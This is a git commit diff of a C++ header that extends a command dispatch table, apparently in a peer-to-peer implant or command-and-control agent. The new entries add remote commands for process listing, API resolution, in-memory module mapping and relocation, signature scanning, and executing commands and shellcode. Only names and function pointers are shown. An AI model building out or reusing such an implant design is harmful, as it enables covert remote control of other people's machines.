c0a5597cc24afdb123d0fd9f783de33dc9034045
1emvr <1emvr@protonmail.com>
2024-08-18 05:07:21 -0400

    updateing p2p

--- core/include/dispatch.hpp
+++ core/include/dispatch.hpp
@@ -3,12 +3,33 @@
 #include <core/corelib.hpp>
 
 _code_seg(".rdata") _command_map cmd_map[] = {
-    // todo: use name hashes instead of obfuscated strings
-    { .name = OBF("DirectoryList"),     .address = Commands::DirectoryList },
-    { .name = OBF("ProcessModules"),    .address = Commands::ProcessModules },
-    { .name = OBF("ProcessList"),       .address = Commands::ProcessList },
-    { .name = OBF("UpdatePeer"),        .address = Commands::UpdatePeer },
-    { .name = OBF("Shutdown"),          .address = Commands::Shutdown },
+    { .name = DIRECTORYLIST,            .address = Commands::DirectoryList },
+    { .name = PROCESSMODULES,           .address = Commands::ProcessModules },
+    { .name = PROCESSLIST,              .address = Commands::ProcessList },
+    { .name = SHUTDOWN,                 .address = Commands::Shutdown },
+    { .name = UPDATEPEER,               .address = Commands::UpdatePeer },
+    { .name = MOVEFILEPOINTER,          .address = Memory::Methods::MoveFilePointer },
+    { .name = GETSTACKCOOKIE,           .address = Memory::Methods::GetStackCookie },
+    { .name = GETPROCESSHEAPS,          .address = Memory::Methods::GetProcessHeaps },
+    { .name = GETINTRESOURCE,           .address = Memory::Methods::GetIntResource },
+    { .name = CREATEIMAGEDATA,          .address = Memory::Methods::CreateImageData },
+    { .name = RESOLVEAPI,               .address = Memory::Context::ResolveApi },
+    { .name = CONTEXTINIT,              .address = Memory::Context::ContextInit },
+    { .name = CONTEXTDESTROY,           .address = Memory::Context::ContextDestroy },
+    { .name = GETINTERNALADDRESS,       .address = Memory::Objects::GetInternalAddress },
+    { .name = RESOLVESYMBOL,            .address = Memory::Objects::ResolveSymbol },
+    { .name = MAPSECTIONS,              .address = Memory::Objects::MapSections },
+    { .name = BASERELOCATION,           .address = Memory::Objects::BaseRelocation },
+    { .name = GETMODULEADDRESS,         .address = Memory::Modules::GetModuleAddress },
+    { .name = GETMODULEENTRY,           .address = Memory::Modules::GetModuleEntry },
+    { .name = GETEXPORTADDRESS,         .address = Memory::Modules::GetExportAddress },
+    { .name = LOADEXPORT,               .address = Memory::Modules::LoadExport },
+    { .name = RELOCATEEXPORT,           .address = Memory::Scanners::RelocateExport },
+    { .name = SIGCOMPARE,               .address = Memory::Scanners::SigCompare },
+    { .name = SIGNATURESCAN,            .address = Memory::Scanners::SignatureScan},
+    { .name = EXECUTEOBJECT,            .address = Memory::Execute::ExecuteObject },
+    { .name = EXECUTECOMMAND,           .address = Memory::Execute::ExecuteCommand },
+    { .name = EXECUTESHELLCODE,         .address = Memory::Execute::ExecuteShellcode },
     { .name = nullptr,                  .address = nullptr }
 };
 
